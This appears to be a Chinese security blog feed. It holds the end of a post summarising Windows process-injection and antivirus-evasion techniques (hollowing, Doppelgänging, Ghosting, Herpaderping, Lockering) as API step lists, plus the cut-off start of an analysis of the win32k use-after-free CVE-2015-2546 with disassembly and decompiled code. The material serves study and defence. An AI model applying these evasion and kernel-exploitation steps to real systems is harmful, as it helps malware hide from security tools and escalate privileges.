id="0x05-Process-Hollowing"><a href="#0x05-Process-Hollowing" class="headerlink" title="0x05 Process Hollowing"></a>0x05 Process Hollowing</h3><ul><li>1) CreateProcess(“svchost.exe”, …, CREATE_SUSPENDED, …);</li><li>2) NtUnmapViewOfSection(…);</li><li>3）VirtualAllocEx(…);</li><li>4) For each section{WriteProcessMemory(…, EVIL_EXE, …);}</li><li>5) Relocate Image*</li><li>6) Set base address in PEB*/PE</li><li>7) SetThreadContext(…);</li><li>8) ResumeThread(…);</li></ul><h3 id="0x06-Process-Doppelganging"><a href="#0x06-Process-Doppelganging" class="headerlink" title="0x06 Process Doppelgänging"></a>0x06 Process Doppelgänging</h3><ul><li><p>Process Doppelgänging其本质是利用TxF的回滚特性，将恶意载荷通过Section创建创建，并根据回滚特性恢复原样的一个技术，关注Process Doppelgänging技术细节之前，首先应该关注<code>NtCreateProcessEx</code>函数。该函数第6个参数是一个SectionHandle句柄。该句柄来自于<code>transacted file</code></p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">NTSTATUS</div><div class="line">NTAPI</div><div class="line">NtCreateProcessEx(OUT PHANDLE ProcessHandle,</div><div class="line">                  <span class="keyword">IN</span> ACCESS_MASK DesiredAccess,</div><div class="line">                  <span class="keyword">IN</span> POBJECT_ATTRIBUTES ObjectAttributes <span class="keyword">OPTIONAL</span>,</div><div class="line">                  <span class="keyword">IN</span> HANDLE ParentProcess,</div><div class="line">                  <span class="keyword">IN</span> <span class="built_in">ULONG</span> Flags,</div><div class="line">                  <span class="keyword">IN</span> HANDLE SectionHandle <span class="keyword">OPTIONAL</span>,</div><div class="line">                  <span class="keyword">IN</span> HANDLE DebugPort <span class="keyword">OPTIONAL</span>,</div><div class="line">                  <span class="keyword">IN</span> HANDLE ExceptionPort <span class="keyword">OPTIONAL</span>,</div><div class="line">                  <span class="keyword">IN</span> <span class="built_in">BOOLEAN</span> InJob)</div></pre></td></tr></table></figure></li><li><p>原理流程,以下过程第一步在验证概念中没有显示</p><ul><li>1) 先用恶意程序写覆盖白程序</li><li>2）然后将覆盖后的文件加载到内存</li><li>3）加载完成后回滚磁盘上的文件为写覆盖之前的文件</li><li>4）最后利用(2)加载到内存中的Section创建进程，最终达到执行恶意程序并绕过杀软检查的目的。</li></ul></li><li><p>实现过程</p><ul><li><p>1）调用<code>NtCreateTransaction</code>创建transaction</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//The ZwCreateTransaction routine creates a transaction object.</span></div><div class="line">__kernel_entry <span class="type">NTSYSCALLAPI</span> <span class="type">NTSTATUS</span> <span class="type">NtCreateTransaction</span>(</div><div class="line">  [out]          <span class="type">PHANDLE</span>            <span class="type">TransactionHandle</span>,</div><div class="line">  [<span class="keyword">in</span>]           <span class="type">ACCESS_MASK</span>        <span class="type">DesiredAccess</span>,</div><div class="line">  [<span class="keyword">in</span>, <span class="keyword">optional</span>] <span class="type">POBJECT_ATTRIBUTES</span> <span class="type">ObjectAttributes</span>,</div><div class="line">  [<span class="keyword">in</span>, <span class="keyword">optional</span>] <span class="type">LPGUID</span>             <span class="type">Uow</span>,</div><div class="line">  [<span class="keyword">in</span>, <span class="keyword">optional</span>] <span class="type">HANDLE</span>             <span class="type">TmHandle</span>,</div><div class="line">  [<span class="keyword">in</span>, <span class="keyword">optional</span>] <span class="type">ULONG</span>              <span class="type">CreateOptions</span>,</div><div class="line">  [<span class="keyword">in</span>, <span class="keyword">optional</span>] <span class="type">ULONG</span>              <span class="type">IsolationLevel</span>,</div><div class="line">  [<span class="keyword">in</span>, <span class="keyword">optional</span>] <span class="type">ULONG</span>              <span class="type">IsolationFlags</span>,</div><div class="line">  [<span class="keyword">in</span>, <span class="keyword">optional</span>] <span class="type">PLARGE_INTEGER</span>     <span class="type">Timeout</span>,</div><div class="line">  [<span class="keyword">in</span>, <span class="keyword">optional</span>] <span class="type">PUNICODE_STRING</span>    <span class="type">Description</span></div><div class="line">);</div></pre></td></tr></table></figure></li><li><p>2) 调用<code>CreateFileTransacted</code>，<code>WriteFile</code>和<code>NtCreateSection</code>等在这个transaction内填入payload</p></li><li><p>3）调用<code>NtRollbackTransaction</code>设置事务回滚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">//The ZwRollbackTransaction routine initiates a <span class="keyword">rollback</span> operation <span class="keyword">for</span> a specified transaction.</div><div class="line">__kernel_entry NTSYSCALLAPI NTSTATUS NtRollbackTransaction(</div><div class="line">  [<span class="keyword">in</span>] HANDLE  TransactionHandle,</div><div class="line">  [<span class="keyword">in</span>] <span class="built_in">BOOLEAN</span> <span class="keyword">Wait</span></div><div class="line">);</div></pre></td></tr></table></figure></li><li><p>4) 调用<code>NtCreateProcessEx</code>和<code>RtlCreateProcessParametersEx</code>以内存Section创建进程。</p></li><li>5）根据PEB读取入口点，调用<code>NtCreateThreadEx</code>执行入口点函数</li></ul></li><li><p>弱点：最终还是要依赖<code>NtCreateThreadEx</code></p></li><li><p><a href="https://www.anquanke.com/post/id/94003" target="_blank" rel="external">来自BlackHat新姿势：Process Doppelgänging攻击技术与贴身防护</a></p></li><li><a href="https://3gstudent.github.io/Process-Doppelganging利用介绍" target="_blank" rel="external">Process-Doppelganging利用介绍</a></li><li><a href="https://github.com/3gstudent/Inject-dll-by-Process-Doppelganging/blob/master/inject.c" target="_blank" rel="external">https://github.com/3gstudent/Inject-dll-by-Process-Doppelganging/blob/master/inject.c</a></li></ul><h3 id="0x07-Transacted-Hollowing"><a href="#0x07-Transacted-Hollowing" class="headerlink" title="0x07 Transacted Hollowing"></a>0x07 Transacted Hollowing</h3><ul><li>Transacted Hollowing是一种集合了<code>Process Hollowing</code>和<code>Process Doppelgänging</code>之间的混合体。</li><li>1) 首先使用<code>Process Doppelgänging</code>中的NTFS函数得到一个<code>Section</code><ul><li>1) CreateTransaction</li><li>2) CreateFileTransactedW</li><li>3) NtCreateSection</li><li>4) RollbackTransaction</li></ul></li><li><p>2) 然后以挂起方式创建目标进程</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">CreateProcessInternalW(hToken,</div><div class="line">    <span class="literal">NULL</span>, <span class="comment">//lpApplicationName</span></div><div class="line">    (LPWSTR)cmdLine, <span class="comment">//lpCommandLine</span></div><div class="line">    <span class="literal">NULL</span>, <span class="comment">//lpProcessAttributes</span></div><div class="line">    <span class="literal">NULL</span>, <span class="comment">//lpThreadAttributes</span></div><div class="line">    FALSE, <span class="comment">//bInheritHandles</span></div><div class="line">    CREATE_SUSPENDED <span class="string">| DETACHED_PROCESS | CREATE_NO_WINDOW, //dwCreationFlags</span></div><div class="line">    <span class="literal">NULL</span>, <span class="comment">//lpEnvironment </span></div><div class="line">    startDir, <span class="comment">//lpCurrentDirectory</span></div><div class="line">    <span class="meta">&amp;si, <span class="comment">//lpStartupInfo</span></span></div><div class="line">    <span class="meta">&amp;pi, <span class="comment">//lpProcessInformation</span></span></div><div class="line">    <span class="meta">&amp;hNewToken</span></div><div class="line">)</div></pre></td></tr></table></figure></li><li><p>3) 类似Process Hollowing，使用<code>NtMapViewOfSection</code>将Section映射入挂起的进程</p></li><li><p>4）通过Wow64GetThreadContext/Wow64SetThreadContext设置入口点</p></li><li><p><a href="https://github.com/hasherezade/transacted_hollowing/blob/main/main.cpp" target="_blank" rel="external">https://github.com/hasherezade/transacted_hollowing/blob/main/main.cpp</a></p></li><li><a href="https://www.freebuf.com/articles/system/181971.html" target="_blank" rel="external">https://www.freebuf.com/articles/system/181971.html</a></li></ul><h3 id="0x08-Process-Ghosting"><a href="#0x08-Process-Ghosting" class="headerlink" title="0x08 Process Ghosting"></a>0x08 Process Ghosting</h3><ul><li><p>现代Windows创建进程的基本流程是这样的：</p><ul><li>1）打开可执行文件，获取文件句柄<code>hFile = CreateFile(“C:\Windows\System32\svchost.exe”)</code></li><li>2) 为文件创建映像，即将文件部分内容映射入内存<code>hSection = NtCreateSection(hFile, SEC_IMAGE)</code></li><li>3) 使用映像部分创建一个进程,hProcess = NtCreateProcessEx(hSection)</li><li>4) 为进程设置环境变量</li><li>5）为进程创建一个主线程NtCreateThreadEx</li></ul></li><li><p>Process Ghosting，顾名思义，进程是一个幽灵一般，没有实体部分。即没有文件。</p></li><li><p>windows中删除文件的方法(并不是实际上的Del)</p><ul><li>1）使用<code>CreateFile/NtOpenFile</code>创建文件的时候，将<code>OpenOptions</code>设置为<code>FILE_DELETE_ON_CLOSE</code>,<code>FILE_SUPERSEDE</code>,<code>FILE_FLAG_DELETE_ON_CLOSE</code></li><li>2) 当通过NtSetInformationFile调用FileDispositionInformation文件信息类时，将FILE_DISPOSITION_INFORMATION结构中的 DeleteFile 字段设置为 TRUE 。</li></ul></li><li><p>但是，只有当Section映射入进程，并关闭句柄，删除标志才能生效。</p></li><li><p>攻击流程：</p><ul><li>1）创建一个文件</li><li>2）使用NtSetInformationFile(FileDispositionInformation)将文件置于删除挂起状态。注意：尝试使用 FILE_DELETE_ON_CLOSE 不会删除文件。</li><li>3）将负载可执行文件写入文件。内容不会保留，因为文件已处于删除挂起状态。删除挂起状态还会阻止外部文件打开尝试。</li><li>4）为文件创建图像部分。</li><li>5）关闭删除挂起句柄，删除文件。</li><li>6）使用图像部分创建一个进程。</li><li>7）分配流程参数和环境变量。</li><li>8）创建一个线程在进程中执行。</li></ul></li><li><p>和<code>Process Doppelgänging技术</code>本质上都是将文件进行删除，<code>Process Ghosting</code>利用文件删除标志实现，而<code>Process Doppelgänging技术</code>是利用NTFS的回滚机制</p></li><li><p><a href="https://github.com/hasherezade/process_ghosting" target="_blank" rel="external">https://github.com/hasherezade/process_ghosting</a></p></li><li><a href="https://www.elastic.co/cn/blog/process-ghosting-a-new-executable-image-tampering-attack" target="_blank" rel="external">hat you need to know about Process Ghosting, a new executable image tampering attack</a></li></ul><h3 id="0x09-Ghostly-Hollowing"><a href="#0x09-Ghostly-Hollowing" class="headerlink" title="0x09 Ghostly Hollowing"></a>0x09 Ghostly Hollowing</h3><ul><li>Ghostly Hollowing是Process Ghosting技术的结合。<br>  <img src="http://hacky.wang/blog/20230303/V9L9jeynDY76.png?imageslim" alt="mark"></li><li><a href="https://github.com/hasherezade/transacted_hollowing/" target="_blank" rel="external">https://github.com/hasherezade/transacted_hollowing/</a></li><li><a href="https://github.com/Hagrid29/herpaderply_hollowing/blob/main/README.md" target="_blank" rel="external">https://github.com/Hagrid29/herpaderply_hollowing/blob/main/README.md</a></li></ul><h3 id="0x10-Process-Herpaderping"><a href="#0x10-Process-Herpaderping" class="headerlink" title="0x10 Process Herpaderping"></a>0x10 Process Herpaderping</h3><ul><li><p>背景：基于现有安全软件更高效的检测恶意软件，在程序运行期间提供了两层保护</p><ul><li>利用PsSetCreateProcessNotifyRoutinsEx回调函数，该回调函数在进程通过NtThreadEx创建主线程的时候被调用。该回调函数针对磁盘文件进行检测，<strong>但是在回调函数被调用之前，可以通过修改磁盘文件内容，从而规避这种检测。</strong></li><li>利用驱动程序在接收到IRP_MJ_CLEANUP（对应关闭文件句柄）时，检查文件内容是否发生改变。</li></ul></li><li><p>原理：综上描述，安全软件在进程创建主线程之后触发PsSetCreateProcessNotifyRoutinsEx回调函数进行检查，但是在之前对磁盘文件进行修改，修改为一个正常的文件，安全软件会认为进程是一个正常文件映射的，从而绕过检查。</p></li><li><p>步骤：</p><ul><li>1）将二级制文件payload写入磁盘，并获取文件句柄</li><li>2）将文件映射入内存</li><li>3）使用映像部分创建一个进程,hProcess = NtCreateProcessEx(hSection)</li><li>4）使用1）中的文件句柄，修改文件，此时为正常文件。此时安全软件的文件检查得以绕过</li><li>5）创建进程的主线程</li></ul></li></ul><ul><li><a href="https://www.4hou.com/posts/qDzy" target="_blank" rel="external">https://www.4hou.com/posts/qDzy</a></li><li><a href="https://jxy-s.github.io/herpaderping/res/DivingDeeper.html" target="_blank" rel="external">Process Herpaderping Technical Deep Dive</a></li><li><a href="http://www.hackdig.com/02/hack-284105.htm" target="_blank" rel="external">从Herpaderping规避技术看防御之难</a></li><li><a href="https://bbs.kanxue.com/thread-271554.htm" target="_blank" rel="external">高级进程注入总结</a></li></ul><h3 id="0x11-Herpaderply-Hollowing"><a href="#0x11-Herpaderply-Hollowing" class="headerlink" title="0x11 Herpaderply Hollowing"></a>0x11 Herpaderply Hollowing</h3><ul><li><p>Herpaderply Hollowing是<code>Process Hollowing</code>和<code>Process Herpaderping</code>的混合体。<br>  <img src="http://hacky.wang/blog/20230303/pjeGDHgcekqI.png?imageslim" alt="mark"></p></li><li><p>步骤：</p><ul><li>1）将二级制文件payload写入磁盘，并获取文件句柄</li><li>2）将文件映射入内存</li><li>3）使用映像部分创建一个进程,hProcess = NtCreateProcessEx(hSection)</li><li>4）使用1）中的文件句柄，修改文件，此时为正常文件。此时安全软件的文件检查得以绕过</li><li>5）以挂起方式创建进程</li><li>6）将Section映射入挂起的进程</li><li>7）运行payload</li></ul></li><li><p><a href="https://github.com/Hagrid29/herpaderply_hollowing" target="_blank" rel="external">https://github.com/Hagrid29/herpaderply_hollowing</a></p></li></ul><h3 id="0x12-Process-Lockering"><a href="#0x12-Process-Lockering" class="headerlink" title="0x12 Process Lockering"></a>0x12 Process Lockering</h3><ul><li>步骤：<ul><li>1）读取payload</li><li>2）将payload写入一个另外一个空文件，用于Lock。</li><li>3）通过<code>DuplicateHandle</code>复制一个文件句柄，并返回新文件的句柄，此时文件处于锁定状态</li><li>4）通过3）中获取的文件句柄，创建一个新的section</li><li>5）通过NtCreateProcessEx(HSection)创建进程</li><li>6）通过PEB寻找入口点，执行payload</li></ul></li></ul><h3 id="0x13-Locker-Hollowing"><a href="#0x13-Locker-Hollowing" class="headerlink" title="0x13 Locker Hollowing"></a>0x13 Locker Hollowing</h3><ul><li>Locker Hollowing 是 Process Hollowing 和 Process Lockering 的混合体。<br>  <img src="http://hacky.wang/blog/20230303/ruXzIPFIwOsU.png?imageslim" alt="mark"></li><li><a href="https://github.com/Hagrid29/herpaderply_hollowing" target="_blank" rel="external">https://github.com/Hagrid29/herpaderply_hollowing</a></li></ul><h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><ul><li><a href="https://www.blackhat.com/docs/eu-17/materials/eu-17-Liberman-Lost-In-Transaction-Process-Doppelganging.pdf" target="_blank" rel="external">https://www.blackhat.com/docs/eu-17/materials/eu-17-Liberman-Lost-In-Transaction-Process-Doppelganging.pdf</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;ul&gt;
&lt;li&gt;本文主要总结了几种不太常见的高级注入技术&lt;ul&gt;
&lt;li&gt;Module Stomping(LoadLibrary)&lt;/li&gt;
&lt;li&gt;Module Stomping(NtMapViewOfSection)&lt;/li&gt;
&lt;li&gt;AtomBombing&lt;/li&gt;
&lt;li&gt;Process Hollowing&lt;/li&gt;
&lt;li&gt;Process Doppelgänging&lt;/li&gt;
&lt;li&gt;Transacted Hollowing&lt;/li&gt;
&lt;li&gt;Process Ghosting等&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="ATT&amp;CK" scheme="https://findream.github.io/categories/ATT-CK/"/>
    
    
  </entry>
  
  <entry>
    <title>CVE-2015-2546内核提权漏洞分析</title>
    <link href="https://findream.github.io/2022/08/16/CVE-2015-2546%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://findream.github.io/2022/08/16/CVE-2015-2546内核提权漏洞分析/</id>
    <published>2022-08-16T06:02:11.000Z</published>
    <updated>2022-10-23T12:42:12.023Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言及原因分析"><a href="#0x00-前言及原因分析" class="headerlink" title="0x00 前言及原因分析"></a>0x00 前言及原因分析</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CVE-2015-2546是发生在<code>win32k!xxxMNMouseMove</code>函数的一个释放后重引用漏洞(UAF),在<code>win32k!xxxMNMouseMove</code>中调用xxxSendMessage发送<code>MN_SELECTITEM(0x1E5)</code>和<code>MN_SETTIMERTOOPENHIERARCHY(0x1F0)</code>消息的时候，执行流可能会回调进入用户侧，当执行流从用户侧返回之后，<code>win32k!xxxMNMouseMove</code>函数并没有对<code>tagPopupMenu</code>对象进行校验，就将其传入<code>win32k!xxxMNHideNextHierarchy</code>对其进行了访问，从而引用UAF。</p><a id="more"></a><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:95AB8263</span> 000                 <span class="selector-tag">push</span>    <span class="selector-tag">edi</span>             ; <span class="selector-tag">Src</span></div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:95AB8264</span> 004                 <span class="selector-tag">push</span>    <span class="selector-attr">[ebp+cmdItem]</span>   ; <span class="selector-tag">WideCharString</span></div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:95AB8267</span> 008                 <span class="selector-tag">push</span>    1<span class="selector-tag">E5h</span>            ; <span class="selector-tag">message</span></div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:95AB826C</span> 00<span class="selector-tag">C</span>                 <span class="selector-tag">push</span>    <span class="selector-tag">esi</span>             ; <span class="selector-tag">P</span></div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:95AB826D</span> 010                 <span class="selector-tag">call</span>    _<span class="selector-tag">xxxSendMessage</span>@<span class="keyword">16</span> ; <span class="selector-tag">xxxSendMessage</span>(<span class="selector-tag">x</span>,<span class="selector-tag">x</span>,<span class="selector-tag">x</span>,<span class="selector-tag">x</span>)</div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:95AB8272</span> 000                 <span class="selector-tag">test</span>    <span class="selector-tag">al</span>, 10<span class="selector-tag">h</span></div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:95AB8274</span> 000                 <span class="selector-tag">jz</span>      <span class="selector-tag">short</span> <span class="selector-tag">loc_95AB82CD</span></div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:95AB8276</span> 000                 <span class="selector-tag">test</span>    <span class="selector-tag">al</span>, 3</div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:95AB8278</span> 000                 <span class="selector-tag">jnz</span>     <span class="selector-tag">short</span> <span class="selector-tag">loc_95AB82CD</span></div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:95AB827A</span> 000                 <span class="selector-tag">push</span>    <span class="selector-tag">edi</span>             ; <span class="selector-tag">Src</span></div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:95AB827B</span> 004                 <span class="selector-tag">push</span>    <span class="selector-tag">edi</span>             ; <span class="selector-tag">WideCharString</span></div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:95AB827C</span> 008                 <span class="selector-tag">push</span>    1<span class="selector-tag">F0h</span>            ; <span class="selector-tag">message</span></div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:95AB8281</span> 00<span class="selector-tag">C</span>                 <span class="selector-tag">push</span>    <span class="selector-tag">esi</span>             ; <span class="selector-tag">P</span></div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:95AB8282</span> 010                 <span class="selector-tag">call</span>    _<span class="selector-tag">xxxSendMessage</span>@<span class="keyword">16</span> ; <span class="selector-tag">xxxSendMessage</span>(<span class="selector-tag">x</span>,<span class="selector-tag">x</span>,<span class="selector-tag">x</span>,<span class="selector-tag">x</span>)</div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:95AB8287</span> 000                 <span class="selector-tag">test</span>    <span class="selector-tag">eax</span>, <span class="selector-tag">eax</span></div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:95AB8289</span> 000                 <span class="selector-tag">jnz</span>     <span class="selector-tag">short</span> <span class="selector-tag">loc_95AB82CD</span></div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:95AB828B</span> 000                 <span class="selector-tag">push</span>    <span class="selector-tag">ebx</span>             ; <span class="selector-tag">a1</span></div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:95AB828C</span> 004                 <span class="selector-tag">call</span>    _<span class="selector-tag">xxxMNHideNextHierarchy</span>@<span class="keyword">4</span> ; <span class="selector-tag">xxxMNHideNextHierarchy</span>(<span class="selector-tag">x</span>)</div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果在执行流回到用户侧时，销毁目标菜单对象，然后在经过巧妙的内存布局，使系统重新分配内存重新占用销毁的目标菜单对象所占据的内存，然后通过巧妙的伪装，在<code>Win32k!xxxMNHideNextHierarchy</code>调用发送<code>MN_SELECTITEM(0x1E5)</code>消息，从而像CVE-2014-4113一样，执行预先设置好的ShellCode提权代码。<br><figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">int</span> __stdcall xxxMNHideNextHierarchy(tagPOPUPMENU *<span class="built_in">a1</span>)</div><div class="line">&#123;</div><div class="line">  tagWND *<span class="built_in">v1</span><span class="comment">; // eax</span></div><div class="line">  tagWND *<span class="built_in">v2</span><span class="comment">; // eax</span></div><div class="line">  int <span class="built_in">v4</span>[<span class="number">3</span>]<span class="comment">; // [esp+4h] [ebp-Ch] BYREF</span></div><div class="line">  <span class="built_in">v1</span> = <span class="built_in">a1</span>-&gt;spwndNextPopup<span class="comment">;                      // 需要两个菜单</span></div><div class="line">  <span class="meta">if</span> ( !<span class="built_in">v1</span> )</div><div class="line">    return <span class="number">0</span><span class="comment">;</span></div><div class="line">  <span class="built_in">v4</span>[<span class="number">0</span>] = *(gptiCurrent + <span class="number">45</span>)<span class="comment">;</span></div><div class="line">  *(gptiCurrent + <span class="number">45</span>) = <span class="built_in">v4</span><span class="comment">;</span></div><div class="line">  <span class="built_in">v4</span>[<span class="number">1</span>] = <span class="built_in">v1</span><span class="comment">;</span></div><div class="line">  ++<span class="built_in">v1</span>-&gt;head.cLockObj<span class="comment">;</span></div><div class="line">  <span class="built_in">v2</span> = <span class="built_in">a1</span>-&gt;spwndNextPopup<span class="comment">;</span></div><div class="line">  <span class="meta">if</span> ( <span class="built_in">v2</span> != <span class="built_in">a1</span>-&gt;spwndActivePopup )             // 判断是否是活跃菜单</div><div class="line">    xxxSendMessage(<span class="built_in">v2</span>, <span class="number">0x1E4</span>, <span class="number">0</span>, <span class="number">0</span>)<span class="comment">;</span></div><div class="line">  xxxSendMessage(<span class="built_in">a1</span>-&gt;spwndNextPopup, <span class="number">0x1E5</span>, -<span class="number">1</span>, <span class="number">0</span>)<span class="comment">;</span></div><div class="line">  return <span class="number">1</span><span class="comment">;</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p><h2 id="0x01-Poc构建"><a href="#0x01-Poc构建" class="headerlink" title="0x01 Poc构建"></a>0x01 Poc构建</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;和CVE-2014-4113一样，触发CVE-2015-2546的<code>win32k!xxxMNMouseMove</code>函数也是在<code>win32k!xxxHandleMenuMessages</code>被调用。在代码88行调用<code>xxxMNMouseMove(v3, pMenuState, v7);</code>触发CVE-2015-2546,而在56行，调用<code>xxxSendMessage(v13, 0x1ED, tagPopupMenu, 0);</code>触发CVE-2014-4113。通过观察代码逻辑，在18行，如果v23不等于0的话，则不会调用<code>xxxMNMouseMove(v3, pMenuState, v7);</code>，所以网上追溯，当message为<code>0x200(WM_MOUSEMOVE)</code>的时候，就会执行<code>xxxMNMouseMove(v3, pMenuState, v7);</code>，所以只要主窗口发送<code>WM_MOUSEMOVE</code>消息的时候就会调用<code>xxxMNMouseMove</code>。<br><figure class="highlight smali"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div></pre></td><td class="code"><pre><div class="line"><span class="built_in"> if </span>( message &gt; 0x104 )                        // CVE-2014-4113 条件2</div><div class="line">  &#123;</div><div class="line">   <span class="built_in"> if </span>( message &lt;= 0x202 )                     // CVE-2014-4113 条件3</div><div class="line">    &#123;</div><div class="line">     <span class="built_in"> if </span>( message == 0x202 )</div><div class="line">       <span class="built_in"> goto </span><span class="class">LABEL_79;</span></div><div class="line">      v20 = message - 0x105;                    // CVE-2014-4113<span class="keyword"> :</span> message = 0xFC + 0x105 = 0x201(WM_LBUTTONDOWN)</div><div class="line">                                                // CVE-2015-2546<span class="keyword"> :</span> message = 0xFB + 0x105 = 0x200(WM_MOUSEMOVE)</div><div class="line">     <span class="built_in"> if </span>( v20 )                                // 条件2&lt;----CVE-2015-2546</div><div class="line">      &#123;</div><div class="line">        v21 = v20 - 1;                          // v20 = 0xFB + 0x1  = 0xFC</div><div class="line">       <span class="built_in"> if </span>( v21 )</div><div class="line">        &#123;</div><div class="line">          v22 = v21 - 0x12;                     // v21 = 0xE9 + 0x12 = 0xFB</div><div class="line">         <span class="built_in"> if </span>( !v22 )</div><div class="line">           <span class="built_in"> return </span>1;</div><div class="line">          v23 = v22 - 0xE8;                     // 0xE8 + 1 = 0xE9</div><div class="line">         <span class="built_in"> if </span>( v23 )                            // CVE-2015-2546 v23 == 0 否则不会触发</div><div class="line">          &#123;</div><div class="line">           <span class="built_in"> if </span>( v23 == 1 )</div><div class="line">            &#123;</div><div class="line">LABEL_13:</div><div class="line">              v12 = pMenuState;</div><div class="line">              pMenuState[4] = -1;</div><div class="line">              pMenuState[2] = v7;</div><div class="line">              pMenuState[3] = SHIWORD(v7);</div><div class="line">              v13 = xxxMNFindWindowFromPoint(v3, &amp;tagPopupMenu, v7);</div><div class="line">              pMenuStatea = IsMFMWFPWindow(v13);</div><div class="line">             <span class="built_in"> if </span>( pMenuStatea )</div><div class="line">              &#123;</div><div class="line">                v40 = *(gptiCurrent + 45);</div><div class="line">                *(gptiCurrent + 45) = &amp;v40;</div><div class="line">                v41 = v13;</div><div class="line">               <span class="built_in"> if </span>( v13 )</div><div class="line">                  ++*(v13 + 4);</div><div class="line">              &#125;</div><div class="line">             <span class="built_in"> if </span>( (v12[1] &amp; 0x400) != 0 )</div><div class="line">              &#123;</div><div class="line">                v12[9] = v12[2];</div><div class="line">                v12[10] = v12[3];</div><div class="line">                v12[12] = tagPopupMenu;</div><div class="line">                LockMFMWFPWindow(v12 + 0xB, v13);</div><div class="line">              &#125;</div><div class="line">             <span class="built_in"> if </span>( (v12[1] &amp; 0x500) != 0 )</div><div class="line">                v12[13] = ((v44 &amp; 2) != 0) + 1;</div><div class="line">             <span class="built_in"> if </span>( !v13 